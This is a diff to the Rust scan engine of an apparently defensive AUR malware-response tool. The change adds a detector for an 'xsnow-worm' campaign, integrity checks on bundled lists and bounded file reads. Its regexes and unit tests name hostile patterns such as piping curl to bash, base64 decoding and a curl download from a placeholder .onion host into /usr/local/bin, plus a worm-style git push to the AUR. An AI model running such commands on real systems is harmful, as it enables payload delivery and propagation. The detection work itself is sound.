@@ -1,6 +1,8 @@
 use crate::alpm;
 use crate::cli::{CommandKind, Parsed};
 use crate::config::Config;
+use crate::inspection::{self, Bounded};
+use crate::integrity;
 use crate::ioc;
 use crate::lists;
 use crate::model::{Campaign, FailOn, ScanState};
@@ -8,7 +10,7 @@ use crate::report;
 use crate::{EXIT_CLEAN, EXIT_COMPROMISE, EXIT_INSUFFICIENT, EXIT_WARN};
 use chrono::Local;
 use regex::Regex;
-use sha2::{Digest, Sha256};
+use sha2::Digest;
 use std::collections::BTreeSet;
 use std::env;
 use std::fs::{self, OpenOptions};
@@ -19,12 +21,71 @@ use std::process::Command;
 use walkdir::WalkDir;
 
 const HOOK_PATTERN: &str = r"atomic-lockfile|js-digest|lockfile-js|nextfile-js|crypto-javascript|linux-utils|bun install js-digest|npm install atomic-lockfile|npm install lockfile-js|npm install nextfile-js|npm install crypto-javascript|npm install linux-utils|sudo\s+(?:\./)?validator";
-const HEURISTIC_PATTERN: &str = r"atomic-lockfile|js-digest|lockfile-js|nextfile-js|crypto-javascript|linux-utils|/var/lib/deps|bun (pm )?install|npm (ci|install).*(--ignore-scripts=false|--foreground-scripts)|cd\s+/tmp.*(?:npm|bun)|sudo\s+(?:\./)?[[:alnum:]_.+-]+|(?:^|[\s/])validator(?:\s|$)|node -e |eval \(|base64 -d|openssl enc|curl .*\| (bash|sh)|wget .*\| (bash|sh)|atob\(|Buffer\.from\(.*base64";
-const MALWARE_HASHES: &[&str] = &[
-    "6144d433f8a0316869877b5f834c801251bbb936e5f1577c5680878c7443c98b",
-    "7883bda1ff15425f2dbe622c45a3ae105ddfa6175009bbf0b0cad9bf5c79b316",
-    "47893d9badc38c54b71321263ce8178c1abb10396e0aadf9793e61ec8829e204",
+const HEURISTIC_PATTERN: &str = r"atomic-lockfile|js-digest|lockfile-js|nextfile-js|crypto-javascript|linux-utils|/var/lib/deps|bun (pm )?install|npm (ci|install).*(--ignore-scripts=false|--foreground-scripts)|cd\s+/tmp.*(?:npm|bun)|sudo\s+(?:\./)?validator|node -e |eval \(|base64 -d|openssl enc|curl .*\| (bash|sh)|wget .*\| (bash|sh)|atob\(|Buffer\.from\(.*base64";
+
+const VALIDATOR_ALIASES: &[&str] = &[
+    "assembler",
+    "bundler",
+    "checker",
+    "compressor",
+    "converter",
+    "decoder",
+    "encryptor",
+    "formatter",
+    "generator",
+    "hasher",
+    "indexer",
+    "linter",
+    "merger",
+    "migrator",
+    "minifier",
+    "normalizer",
+    "optimizer",
+    "packer",
+    "parser",
+    "preprocessor",
+    "renderer",
+    "resolver",
+    "serializer",
+    "splitter",
+    "tagger",
+    "translator",
+    "validator",
 ];
+
+fn xsnow_hook_evidence(input: &str) -> bool {
+    let lowered = input.to_ascii_lowercase();
+    let systemmanager = lowered.contains("systemmanager");
+    let downloader = lowered.contains("curl ") || lowered.contains("wget ");
+    let propagation = lowered.contains("aur.archlinux.org")
+        && lowered.contains("git ")
+        && lowered.contains("push");
+    (systemmanager
+        && downloader
+        && (lowered.contains(".onion") || lowered.contains("/usr/local/bin")))
+        || (propagation && (systemmanager || lowered.contains(".onion")))
+}
+
+fn known_hook_evidence(input: &str, pattern: &Regex) -> bool {
+    pattern.is_match(input) || xsnow_hook_evidence(input) || validator_loader_evidence(input)
+}
+
+fn validator_loader_evidence(input: &str) -> bool {
+    let lowered = input.to_ascii_lowercase();
+    VALIDATOR_ALIASES.iter().any(|alias| {
+        let staged = lowered.contains(&format!("source=(\"{alias}"))
+            || lowered.contains(&format!("source=('{alias}"))
+            || lowered.contains(&format!("$srcdir/{alias}"));
+        let privileged = lowered.contains(&format!("sudo $srcdir/{alias}"))
+            || lowered.contains(&format!("sudo \"$srcdir/{alias}\""))
+            || lowered.contains(&format!("doas $srcdir/{alias}"));
+        staged && privileged
+    })
+}
+
+fn is_package_script(name: &str) -> bool {
+    matches!(name, "PKGBUILD" | ".INSTALL" | "install") || name.ends_with(".install")
+}
 
 #[derive(Clone, Debug)]
 pub struct Paths {
@@ -37,8 +98,9 @@ pub struct Paths {
 
 impl Paths {
     pub fn resolve(config: &Config) -> Self {
-        let root = env::var_os("AUR_RESPONSE_DIR")
-            .map(PathBuf::from)
+        let explicit_root = env::var_os("AUR_RESPONSE_DIR").map(PathBuf::from);
+        let root = explicit_root
+            .clone()
             .unwrap_or_else(|| default_root(env::current_dir().ok()));
         let xdg = env::var_os("XDG_DATA_HOME")
             .map(PathBuf::from)
@@ -51,7 +113,9 @@ impl Paths {
             .join("aur-response");
         let reports = config.reports_dir.clone().unwrap_or_else(|| {
             let local = root.join("reports");
-            if fs::metadata(&local).is_ok_and(|m| !m.permissions().readonly()) {
+            if explicit_root.is_some()
+                || fs::metadata(&local).is_ok_and(|m| !m.permissions().readonly())
+            {
                 local
             } else {
                 xdg.join("reports")
@@ -81,15 +145,7 @@ impl Paths {
                 return PathBuf::from(path);
             }
         }
-        match campaign {
-            Campaign::AtomicArch => config.atomic_arch_list_file.clone(),
-            Campaign::ChaosRat => config.chaos_rat_list_file.clone(),
-            Campaign::ShaiHulud => config.shai_hulud_list_file.clone(),
-            Campaign::OpenconnectSso => config.openconnect_sso_list_file.clone(),
-            Campaign::BrowshLinuxUtils => config.browsh_linux_utils_list_file.clone(),
-            Campaign::Xeactor => config.xeactor_list_file.clone(),
-        }
-        .unwrap_or_else(|| {
+        config.campaign_list_file(campaign).unwrap_or_else(|| {
             self.data_lists
                 .join(format!("{}-pkgs.txt", campaign.slug()))
         })
@@ -115,16 +171,49 @@ pub struct Engine {
 }
 
 impl Engine {
+    fn integrity_manifest(&self) -> Result<integrity::Manifest, String> {
+        let configured = self.paths.root.join("data/integrity.toml");
+        let path = if configured.is_file() {
+            configured
+        } else {
+            default_root(env::current_dir().ok()).join("data/integrity.toml")
+        };
+        integrity::load(&path)
+    }
+
+    fn validate_registry_integrity(&mut self, quiet: bool) -> bool {
+        let result = self
+            .integrity_manifest()
+            .and_then(|manifest| integrity::validate_registry(&manifest));
+        if let Err(error) = result {
+            self.insufficient(quiet, error);
+            return false;
+        }
+        true
+    }
+
+    fn validate_bundled_list(&mut self, campaign: Campaign, path: &Path, quiet: bool) -> bool {
+        let bundled = self
+            .paths
+            .data_lists
+            .join(format!("{}-pkgs.txt", campaign.slug()));
+        if path != bundled {
+            return true;
+        }
+        let result = self
+            .integrity_manifest()
+            .and_then(|manifest| integrity::validate_list(&manifest, campaign, path));
+        if let Err(error) = result {
+            self.insufficient(quiet, error);
+            return false;
+        }
+        true
+    }
+
     fn campaign_enabled(&self, options: &crate::model::RunOptions, slug: &str) -> bool {
         options.campaigns.contains(slug)
-            || match slug {
-                "chaos-rat" => self.config.enable_chaos_rat == Some(true),
-                "shai-hulud" => self.config.enable_shai_hulud == Some(true),
-                "openconnect-sso" => self.config.enable_openconnect_sso == Some(true),
-                "browsh-linux-utils" => self.config.enable_browsh_linux_utils == Some(true),
-                "xeactor" => self.config.enable_xeactor == Some(true),
-                _ => false,
-            }
+            || Campaign::from_slug(slug)
+                .is_some_and(|campaign| self.config.campaign_enabled(campaign))
     }
 
     pub fn new(config: Config) -> Self {
@@ -150,8 +239,11 @@ impl Engine {
                 return Some(fetched);
             }
         }
-        match fs::read_to_string(&path) {
-            Ok(input) => {
+        if !self.validate_bundled_list(campaign, &path, quiet) {
+            return None;
+        }
+        match inspection::read_text(&path) {
+            Ok(Bounded::Value(input)) => {
                 let packages = input
                     .lines()
                     .map(str::trim)
@@ -171,6 +263,10 @@ impl Engine {
                 } else {
                     Some(packages)
                 }
+            }
+            Ok(Bounded::Oversize) => {
+                self.skipped_oversize(quiet, &path);
+                None
             }
             Err(e) => {
                 self.insufficient(
@@ -247,6 +343,10 @@ impl Engine {
                     .unwrap_or_default(),
                 lists::plain as Parser,
             )],
+            Campaign::XsnowWorm => vec![(
+                self.config.xsnow_worm_url.clone().unwrap_or_default(),
+                lists::plain as Parser,
+            )],
             Campaign::Xeactor => vec![(
                 self.config.xeactor_url.clone().unwrap_or_default(),
                 lists::plain as Parser,
@@ -255,7 +355,14 @@ impl Engine {
         let mut merged = BTreeSet::new();
         for (url, parser) in sources.into_iter().filter(|(url, _)| !url.is_empty()) {
             let output = Command::new("curl")
-                .args(["-fsSL", "--max-time", "20", &url])
+                .args([
+                    "-fsSL",
+                    "--max-time",
+                    "20",
+                    "--max-filesize",
+                    "1048576",
+                    &url,
+                ])
                 .output();
             let Ok(output) = output else {
                 continue;
@@ -266,14 +373,42 @@ impl Engine {
             let input = String::from_utf8_lossy(&output.stdout);
             merged.extend(parser(&input));
         }
+        let bundled = self
+            .paths
+            .data_lists
+            .join(format!("{}-pkgs.txt", campaign.slug()));
+        let manifest_path = self.paths.root.join("data/integrity.toml");
+        if manifest_path.is_file() && bundled.is_file() {
+            let trusted = integrity::load(&manifest_path)
+                .and_then(|manifest| {
+                    integrity::validate_list(&manifest, campaign, &bundled).map(|_| manifest)
+                })
+                .and_then(|_| match inspection::read_text(&bundled) {
+                    Ok(Bounded::Value(input)) => Ok(input),
+                    Ok(Bounded::Oversize) => {
+                        Err(format!("{} exceeds inspection limit", bundled.display()))
+                    }
+                    Err(error) => Err(format!("{}: {error}", bundled.display())),
+                });
+            match trusted {
+                Ok(input) => merged.extend(lists::plain(&input)),
+                Err(error) => {
+                    self.insufficient(quiet, error);
+                    return None;
+                }
+            }
+        }
         if merged.is_empty() {
             return None;
         }
 
         let path = self.paths.list(campaign, &self.config);
-        let old = fs::read_to_string(&path)
+        let old = inspection::read_text(&path)
             .ok()
-            .map(|input| lists::plain(&input));
+            .and_then(|input| match input {
+                Bounded::Value(input) => Some(lists::plain(&input)),
+                Bounded::Oversize => None,
+            });
         if let Some(old) = &old {
             self.state.counters.list_added += merged.difference(old).count() as u64;
             self.state.counters.list_removed += old.difference(&merged).count() as u64;
@@ -316,16 +451,21 @@ impl Engine {
         self.state.log(quiet, format!("[INSUFFICIENT] {reason}"));
     }
 
+    fn skipped_oversize(&mut self, quiet: bool, path: &Path) {
+        self.state.counters.files_skipped_oversize += 1;
+        self.insufficient(
+            quiet,
+            format!("hostile file exceeds inspection limit: {}", path.display()),
+        );
+    }
+
+    fn unreadable_path(&mut self, quiet: bool, path: &Path, error: impl std::fmt::Display) {
+        self.state.counters.roots_unreadable += 1;
+        self.insufficient(quiet, format!("cannot inspect {}: {error}", path.display()));
+    }
+
     fn campaign(slug: &str) -> Option<Campaign> {
-        match slug {
-            "atomic-arch" => Some(Campaign::AtomicArch),
-            "chaos-rat" => Some(Campaign::ChaosRat),
-            "shai-hulud" => Some(Campaign::ShaiHulud),
-            "openconnect-sso" => Some(Campaign::OpenconnectSso),
-            "browsh-linux-utils" => Some(Campaign::BrowshLinuxUtils),
-            "xeactor" => Some(Campaign::Xeactor),
-            _ => None,
-        }
+        Campaign::from_slug(slug)
     }
 
     fn window_regex(&self, campaign: Campaign) -> Option<&str> {
@@ -488,6 +628,13 @@ impl Engine {
                         .optional_warnings
                         .insert("browsh-linux-utils".into());
                 }
+                Campaign::XsnowWorm => {
+                    self.state.counters.xsnow_worm_installed += 1;
+                    if high {
+                        self.state.counters.xsnow_worm_high_risk += 1;
+                    }
+                    self.state.optional_warnings.insert("xsnow-worm".into());
+                }
                 Campaign::Xeactor => {
                     self.state.counters.xeactor_installed += 1;
                     if high {
@@ -575,6 +722,10 @@ impl Engine {
                         .optional_warnings
                         .insert("browsh-linux-utils".into());
                 }
+                Campaign::XsnowWorm => {
+                    self.state.counters.xsnow_worm_timeline_hits += lines.len() as u64;
+                    self.state.optional_warnings.insert("xsnow-worm".into());
+                }
                 Campaign::Xeactor => {
                     self.state.counters.xeactor_timeline_hits += lines.len() as u64;
                     self.state.optional_warnings.insert("xeactor".into());
@@ -615,17 +766,28 @@ impl Engine {
     }
 
     fn scan_artifacts(&mut self, quick: bool, quiet: bool) {
+        if !self.validate_registry_integrity(quiet) {
+            return;
+        }
         let hook = Regex::new(HOOK_PATTERN).unwrap();
         for root in self.artifact_roots(quick) {
             if !root.exists() {
                 continue;
             }
-            for entry in WalkDir::new(root)
+            self.state.counters.roots_scanned += 1;
+            for item in WalkDir::new(root)
                 .follow_links(false)
                 .max_depth(if quick { 6 } else { 12 })
                 .into_iter()
-                .filter_map(Result::ok)
             {
+                let entry = match item {
+                    Ok(entry) => entry,
+                    Err(error) => {
+                        let path = error.path().unwrap_or_else(|| Path::new("<unknown>"));
+                        self.unreadable_path(quiet, path, &error);
+                        continue;
+                    }
+                };
                 if !entry.file_type().is_file() {
                     continue;
                 }
@@ -636,7 +798,11 @@ impl Engine {
                     .unwrap_or_default();
                 let path_text = path.to_string_lossy();
                 let suspicious_name =
-                    matches!(name, "deps" | "PKGBUILD" | ".INSTALL" | "validator")
+                    matches!(name, "deps" | "validator" | "systemmanager" | ".agent.bin")
+                        || is_package_script(name)
+                        || fs::metadata(path).is_ok_and(|metadata| {
+                            matches!(metadata.len(), 43_624 | 43_640 | 3_668_704)
+                        })
                         || [
                             "atomic-lockfile",
                             "js-digest",
@@ -652,17 +818,25 @@ impl Engine {
                 if !suspicious_name {
                     continue;
                 }
-                let bytes = match fs::read(path) {
-                    Ok(v) => v,
-                    Err(_) => continue,
+                let bytes = match inspection::read(path, inspection::MAX_ARTIFACT_BYTES) {
+                    Ok(Bounded::Value(bytes)) => bytes,
+                    Ok(Bounded::Oversize) => {
+                        self.skipped_oversize(quiet, path);
+                        continue;
+                    }
+                    Err(error) => {
+                        self.unreadable_path(quiet, path, error);
+                        continue;
+                    }
                 };
-                let hash = format!("{:x}", Sha256::digest(&bytes));
-                let text_hit = std::str::from_utf8(&bytes).is_ok_and(|v| hook.is_match(v));
+                let hash = format!("{:x}", sha2::Sha256::digest(&bytes));
+                let text_hit =
+                    std::str::from_utf8(&bytes).is_ok_and(|v| known_hook_evidence(v, &hook));
                 let embedded_elf = (path_text.contains("linux-utils")
                     || path_text.contains("node_modules")
                     || path_text.contains("/.npm/"))
                     && bytes.windows(4).any(|window| window == b"\x7fELF");
-                if MALWARE_HASHES.contains(&hash.as_str()) || text_hit || embedded_elf {
+                if ioc::MALWARE_HASHES.contains(&hash.as_str()) || text_hit || embedded_elf {
                     let item = path.display().to_string();
                     self.state.finding("artifacts", &item);
                     self.state.counters.artifact_critical += 1;
@@ -672,30 +846,37 @@ impl Engine {
             }
         }
         let home = env::var_os("HOME").map(PathBuf::from).unwrap_or_default();
-        for item in ioc::cache_iocs(&home, quick) {
-            self.record_critical(quiet, "artifacts", item);
-        }
-        for item in ioc::runtime_iocs(&home) {
-            self.state.counters.runtime_iocs += 1;
-            self.record_critical(quiet, "runtime_iocs", item);
-        }
-        for item in ioc::persistence_iocs(&home) {
-            self.record_critical(quiet, "artifacts", item);
-        }
+        self.record_ioc_scan(quiet, "artifacts", false, ioc::cache_iocs(&home, quick));
+        self.record_ioc_scan(quiet, "runtime_iocs", true, ioc::runtime_iocs(&home));
+        self.record_ioc_scan(quiet, "artifacts", false, ioc::persistence_iocs(&home));
         for item in ioc::ebpf_iocs() {
             self.record_critical(quiet, "artifacts", item);
         }
         if self.paths.pacman_local.is_dir() {
-            for entry in WalkDir::new(&self.paths.pacman_local)
-                .max_depth(3)
-                .into_iter()
-                .filter_map(Result::ok)
-            {
+            self.state.counters.roots_scanned += 1;
+            for item in WalkDir::new(&self.paths.pacman_local).max_depth(3) {
+                let entry = match item {
+                    Ok(entry) => entry,
+                    Err(error) => {
+                        let path = error.path().unwrap_or_else(|| Path::new("<unknown>"));
+                        self.unreadable_path(quiet, path, &error);
+                        continue;
+                    }
+                };
                 if entry.file_name() != "install" || !entry.file_type().is_file() {
                     continue;
                 }
-                if fs::read_to_string(entry.path()).is_ok_and(|text| hook.is_match(&text)) {
-                    self.record_critical(quiet, "artifacts", entry.path().display().to_string());
+                match inspection::read_text(entry.path()) {
+                    Ok(Bounded::Value(text)) if known_hook_evidence(&text, &hook) => {
+                        self.record_critical(
+                            quiet,
+                            "artifacts",
+                            entry.path().display().to_string(),
+                        );
+                    }
+                    Ok(Bounded::Value(_)) => {}
+                    Ok(Bounded::Oversize) => self.skipped_oversize(quiet, entry.path()),
+                    Err(error) => self.unreadable_path(quiet, entry.path(), error),
                 }
             }
         } else {
@@ -723,12 +904,52 @@ impl Engine {
         }
     }
 
+    fn record_ioc_scan(
+        &mut self,
+        quiet: bool,
+        category: &str,
+        runtime: bool,
+        result: ioc::ScanResult,
+    ) {
+        self.state.counters.roots_scanned += result.roots_scanned;
+        self.state.counters.roots_unreadable += result.roots_unreadable;
+        self.state.counters.files_skipped_oversize += result.files_skipped_oversize;
+        self.state.counters.runtime_adapters_unavailable += result.runtime_adapters_unavailable;
+        if result.roots_unreadable > 0 {
+            self.insufficient(
+                quiet,
+                format!("{category}: {} path(s) unreadable", result.roots_unreadable),
+            );
+        }
+        if result.files_skipped_oversize > 0 {
+            self.insufficient(
+                quiet,
+                format!(
+                    "{category}: {} file(s) exceeded inspection limits",
+                    result.files_skipped_oversize
+                ),
+            );
+        }
+        if result.runtime_adapters_unavailable > 0 {
+            self.insufficient(
+                quiet,
+                format!(
+                    "{category}: {} runtime adapter(s) unavailable",
+                    result.runtime_adapters_unavailable
+                ),
+            );
+        }
+        for item in result.hits {
+            if runtime {
+                self.state.counters.runtime_iocs += 1;
+            }
+            self.record_critical(quiet, category, item);
+        }
+    }
+
     fn scan_similar(&mut self, quick: bool, quiet: bool) {
-        let pattern = self
-            .config
-            .similar_heuristics_pattern
-            .as_deref()
-            .unwrap_or(HEURISTIC_PATTERN);
+        let configured_pattern = self.config.similar_heuristics_pattern.clone();
+        let pattern = configured_pattern.as_deref().unwrap_or(HEURISTIC_PATTERN);
         let Ok(re) = Regex::new(pattern) else {
             self.insufficient(
                 quiet,
@@ -737,22 +958,44 @@ impl Engine {
             return;
         };
         for root in self.artifact_roots(quick) {
-            for entry in WalkDir::new(root)
+            if !root.exists() {
+                continue;
+            }
+            self.state.counters.roots_scanned += 1;
+            for item in WalkDir::new(root)
                 .follow_links(false)
                 .max_depth(if quick { 5 } else { 10 })
                 .into_iter()
-                .filter_map(Result::ok)
             {
-                if !matches!(
-                    entry.file_name().to_str(),
-                    Some("PKGBUILD" | ".INSTALL" | "install")
-                ) {
-                    continue;
-                }
-                let Ok(input) = fs::read_to_string(entry.path()) else {
+                let entry = match item {
+                    Ok(entry) => entry,
+                    Err(error) => {
+                        let path = error.path().unwrap_or_else(|| Path::new("<unknown>"));
+                        self.unreadable_path(quiet, path, &error);
+                        continue;
+                    }
+                };
+                let Some(name) = entry.file_name().to_str() else {
                     continue;
                 };
-                if re.is_match(&input)
+                if !entry.file_type().is_file() || !is_package_script(name) {
+                    continue;
+                }
+                let input = match inspection::read_text(entry.path()) {
+                    Ok(Bounded::Value(input)) => input,
+                    Ok(Bounded::Oversize) => {
+                        self.skipped_oversize(quiet, entry.path());
+                        continue;
+                    }
+                    Err(error) => {
+                        self.unreadable_path(quiet, entry.path(), error);
+                        continue;
+                    }
+                };
+                let evidence = re.is_match(&input)
+                    || (configured_pattern.is_none()
+                        && (xsnow_hook_evidence(&input) || validator_loader_evidence(&input)));
+                if evidence
                     && !input
                         .lines()
                         .any(|v| v.starts_with("# Maintainer:") && v.contains("base64 -d"))
@@ -1044,7 +1287,7 @@ impl Engine {
             .map(|w| w[1].as_str())
             .unwrap_or("atomic-arch");
         let Some(campaign) = Self::campaign(list_slug) else {
-            eprintln!("ERROR: unknown list type '{list_slug}' (use atomic-arch, chaos-rat, shai-hulud, openconnect-sso, browsh-linux-utils, or xeactor)");
+            eprintln!("ERROR: unknown list type '{list_slug}' (use atomic-arch, chaos-rat, shai-hulud, openconnect-sso, browsh-linux-utils, xsnow-worm, or xeactor)");
             return crate::EXIT_INVALID;
         };
         let explicit = args
@@ -1070,14 +1313,7 @@ impl Engine {
         } else {
             explicit
         };
-        let label = match campaign {
-            Campaign::AtomicArch => "Atomic Arch",
-            Campaign::ChaosRat => "Chaos RAT",
-            Campaign::ShaiHulud => "Shai-Hulud",
-            Campaign::OpenconnectSso => "OpenConnect SSO",
-            Campaign::BrowshLinuxUtils => "browsh/linux-utils",
-            Campaign::Xeactor => "xeactor",
-        };
+        let label = campaign.display_name();
         if verify {
             if packages.is_empty() {
                 println!("VERIFY OK: no {label} packages remain installed.");
@@ -1155,8 +1391,16 @@ impl Engine {
                 println!("  Skip: {} (not found)", path.display());
                 continue;
             }
-            let Ok(input) = fs::read_to_string(&path) else {
-                continue;
+            let input = match inspection::read_text(&path) {
+                Ok(Bounded::Value(input)) => input,
+                Ok(Bounded::Oversize) => {
+                    eprintln!("ERROR: {} exceeds inspection limit", path.display());
+                    return EXIT_INSUFFICIENT;
+                }
+                Err(error) => {
+                    eprintln!("ERROR: cannot read {}: {error}", path.display());
+                    return EXIT_INSUFFICIENT;
+                }
             };
             let kept = input
                 .lines()
@@ -1321,6 +1565,7 @@ impl Engine {
             FailOn::ShaiHulud => self.state.optional_warnings.contains("shai-hulud"),
             FailOn::OpenconnectSso => self.state.optional_warnings.contains("openconnect-sso"),
             FailOn::BrowshLinuxUtils => self.state.optional_warnings.contains("browsh-linux-utils"),
+            FailOn::XsnowWorm => self.state.optional_warnings.contains("xsnow-worm"),
             FailOn::Xeactor => self.state.optional_warnings.contains("xeactor"),
             FailOn::All => !self.state.optional_warnings.is_empty(),
             _ => false,
@@ -1354,28 +1599,18 @@ impl Engine {
                 if !o.skip_pkg_check {
                     self.scan_packages(Campaign::AtomicArch, o.all_time, o.quiet);
                 }
-                for slug in [
-                    "chaos-rat",
-                    "shai-hulud",
-                    "openconnect-sso",
-                    "browsh-linux-utils",
-                    "xeactor",
-                ] {
+                for campaign in Campaign::OPTIONAL {
+                    let slug = campaign.slug();
                     if self.campaign_enabled(o, slug) {
-                        self.scan_packages(Self::campaign(slug).unwrap(), o.all_time, o.quiet);
+                        self.scan_packages(campaign, o.all_time, o.quiet);
                     }
                 }
                 self.scan_aur_window(o.quiet);
                 self.scan_timeline(Campaign::AtomicArch, o.all_time, o.quiet);
-                for slug in [
-                    "chaos-rat",
-                    "shai-hulud",
-                    "openconnect-sso",
-                    "browsh-linux-utils",
-                    "xeactor",
-                ] {
+                for campaign in Campaign::OPTIONAL {
+                    let slug = campaign.slug();
                     if self.campaign_enabled(o, slug) {
-                        self.scan_timeline(Self::campaign(slug).unwrap(), o.all_time, o.quiet);
+                        self.scan_timeline(campaign, o.all_time, o.quiet);
                     }
                 }
                 self.scan_artifacts(o.quick, o.quiet);
@@ -1467,6 +1702,7 @@ impl Engine {
             let shai = self.paths.list(Campaign::ShaiHulud, &self.config);
             let openconnect = self.paths.list(Campaign::OpenconnectSso, &self.config);
             let browsh = self.paths.list(Campaign::BrowshLinuxUtils, &self.config);
+            let xsnow = self.paths.list(Campaign::XsnowWorm, &self.config);
             let xeactor = self.paths.list(Campaign::Xeactor, &self.config);
             if let Ok(path) = report::write_summary(
                 &self.paths.reports,
@@ -1478,6 +1714,7 @@ impl Engine {
                     (Campaign::ShaiHulud, shai.as_path()),
                     (Campaign::OpenconnectSso, openconnect.as_path()),
                     (Campaign::BrowshLinuxUtils, browsh.as_path()),
+                    (Campaign::XsnowWorm, xsnow.as_path()),
                     (Campaign::Xeactor, xeactor.as_path()),
                 ],
             ) {
@@ -1513,9 +1750,44 @@ impl Engine {
 
 #[cfg(test)]
 mod tests {
-    use super::default_root;
+    use super::{
+        default_root, is_package_script, validator_loader_evidence, xsnow_hook_evidence, Engine,
+    };
+    use crate::config::Config;
+    use crate::model::FailOn;
+    use crate::{EXIT_CLEAN, EXIT_INSUFFICIENT, EXIT_WARN};
     use std::fs;
     use std::path::PathBuf;
+
+    #[test]
+    fn xsnow_rules_require_compound_evidence() {
+        assert!(xsnow_hook_evidence(
+            "curl -o /usr/local/bin/systemmanager http://example.onion/x"
+        ));
+        assert!(xsnow_hook_evidence(
+            "git remote add aur ssh://aur.archlinux.org/x; git push aur main; systemmanager"
+        ));
+        assert!(!xsnow_hook_evidence("homepage=https://example.onion"));
+        assert!(!xsnow_hook_evidence("systemmanager --version"));
+    }
+
+    #[test]
+    fn package_scripts_include_dot_prefixed_install_files() {
+        assert!(is_package_script("PKGBUILD"));
+        assert!(is_package_script(".xsnow.install"));
+        assert!(!is_package_script("install-notes.txt"));
+    }
+
+    #[test]
+    fn validator_loader_rules_require_staged_privileged_alias() {
+        assert!(validator_loader_evidence(
+            "source=('resolver')\nbuild() { sudo $srcdir/resolver; }"
+        ));
+        assert!(!validator_loader_evidence(
+            "post_install() { sudo systemctl daemon-reload; }"
+        ));
+        assert!(!validator_loader_evidence("source=('resolver')"));
+    }
 
     #[test]
     fn development_root_is_resolved_from_a_runtime_ancestor() {
@@ -1543,5 +1815,26 @@ mod tests {
             default_root(None),
             PathBuf::from("/usr/share/aur-response-toolkit")
         );
+    }
+
+    #[test]
+    fn incomplete_coverage_takes_precedence_over_compromise_for_default_policy() {
+        let mut engine = Engine::new(Config::default());
+        engine.state.compromise = true;
+        engine.state.insufficient = true;
+        assert_eq!(engine.final_exit(FailOn::All), EXIT_INSUFFICIENT);
+        assert_eq!(engine.final_exit(FailOn::Compromise), EXIT_INSUFFICIENT);
+        assert_eq!(engine.final_exit(FailOn::None), EXIT_CLEAN);
+    }
+
+    #[test]
+    fn campaign_specific_exit_only_escalates_matching_warning() {
+        let mut engine = Engine::new(Config::default());
+        engine.state.compromise = false;
+        engine.state.insufficient = false;
+        engine.state.optional_warnings.insert("xsnow-worm".into());
+        assert_eq!(engine.final_exit(FailOn::XsnowWorm), EXIT_WARN);
+        assert_eq!(engine.final_exit(FailOn::OpenconnectSso), EXIT_CLEAN);
+        assert_eq!(engine.final_exit(FailOn::All), EXIT_WARN);
     }
 }
